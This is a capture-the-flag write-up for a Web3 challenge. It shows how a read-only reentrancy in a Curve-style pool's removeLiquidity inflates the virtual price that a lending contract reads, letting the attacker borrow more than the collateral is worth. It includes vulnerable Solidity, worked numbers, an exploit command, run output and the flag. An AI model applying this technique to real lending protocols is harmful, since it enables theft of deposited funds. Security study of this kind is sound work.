# Trompe-l'œil — Web3 (Hard)

**Flag:** `H7CTF{0bba5486-eebc-4ee8-a3de-a55e80c787f1}` · Files: `Setup.sol`, `Pool.sol`, `MirrorLend.sol`, `Token.sol`, `IERC20.sol` (Solidity 0.8.24)

## Challenge

MirrorLend lends mUSD against LP tokens of a Curve-style pool named Mirror. The challenge asserts "the books all match" and hints: a trompe-l'œil painting only needs to look real for as long as somebody is looking at it. The win condition is `Setup.isSolved()`:

```solidity
lend.totalDebt() > lend.totalCollateralLP() * pool.get_virtual_price() / 1e18
```

The instance is an EVM node: `GET /` on the challenge URL itself returns the rpc endpoint (POST to the same URL), chain id 31337, the player's private key and the Setup address, with no further authentication. Once solved, `GET /flag`.

## Initial Analysis

The winning inequality only flips sign in two ways: make `totalDebt` grow faster than the collateral value, or make `get_virtual_price()` drop after borrowing. The second is hopeless because Pool assets only leave it through `removeLiquidity`, and that function divides both asset types by exactly the ratio `lp/totalSupply`, so the price is unchanged; donating directly only raises the price permanently. So the price must be made falsely high, temporarily, at exactly the moment `borrow()` runs.

`MirrorLend.borrow` uses no cache at all, it calls `pool.get_virtual_price()` directly:

```solidity
uint256 maxDebt = collateralLP[msg.sender] * pool.get_virtual_price() / 1e18;
```

So all we need is one instant where the virtual price is inflated.

## Exploit Chain

**Step 1 - Finding that instant inside `removeLiquidity`.** Here is the bug: burn LP and pay out ETH first, pay out the token afterwards.

```solidity
uint256 ethOut   = address(this).balance * lp / totalSupply;
uint256 tokenOut = token.balanceOf(address(this)) * lp / totalSupply;
balanceOf[msg.sender] -= lp;
totalSupply -= lp;                        // denominator already decreased
(bool ok, ) = msg.sender.call{value: ethOut}("");   // <- callback to the attacker contract
require(token.transfer(msg.sender, tokenOut));      // tử số chưa trừ phần token
```

Inside the callback, `get_virtual_price()` takes `(ETH already decreased + token NOT yet decreased) / (supply already decreased)`. A pool balanced 50/50 still yields an approximately correct price, but a pool skewed towards the token magnifies the part that is counted twice.

**Step 2 - Skewing the pool with a token-only deposit.** `addLiquidity` allows `msg.value = 0` and still computes a fair price, so nothing is lost:

```js
pool.addLiquidity(100n * 10n ** 18n)   // without sending ETH
```

The pool becomes 10 ETH + 110 mUSD, `totalSupply = 120`, the price is still exactly `1e18`. We keep 100 LP.

**Step 3 - Splitting the LP: half as collateral, half to burn.** `deposit(50)` into MirrorLend, then `removeLiquidity(50)` from a contract with a `receive()`. Inside the callback:

```
ethOut  = 10 * 50/120 = 4.1667
giá ảo  = (10 - 4.1667 + 110) / (120 - 50) = 115.8333 / 70 = 1.6547619e18
```

`borrow()` sees that price and therefore allows borrowing `50 * 1.6547619 = 82.73809523809524` mUSD from the 1000 mUSD reserve. The callback returns, the token part is transferred out, and the price goes back to exactly `1e18`.

**Step 4 - Verifying correctness.** These numbers are not post-hoc reasoning: `82.73809523809524` is exactly `50 * 115.8333.../70` computed by hand from the on-chain state read beforehand (`analysis/state.mjs` prints `pool eth 10, pool tok 10, totalSupply 20, vprice 1`). After the transaction, read back from the chain:

```
vprice 1  totalDebt 82.73809523809524  collateralValue 50  isSolved true
```

Debt is 1.65 times the collateral value, and the difference cannot be called back because MirrorLend has no repay function in the challenge.

## Flag
```bash
CTF_PK=<private key from GET /> node exploit.mjs
```

```
deploying attack...
attack 0xdD9751bB819BAcE6A3dDEA42a8438a23E4177ab4 gas 490730n
funding 100 mUSD -> 0xdD9751bB819BAcE6A3dDEA42a8438a23E4177ab4
running exploit...
tx 0xbdeb34ea80abc37718a37da731d78cf8aa42d49a081fad044578b25ecc78bdf7 status 1 gas 272050n
vprice 1 totalDebt 82.73809523809524 collateralValue 50
isSolved true
```

```
H7CTF{0bba5486-eebc-4ee8-a3de-a55e80c787f1}
```
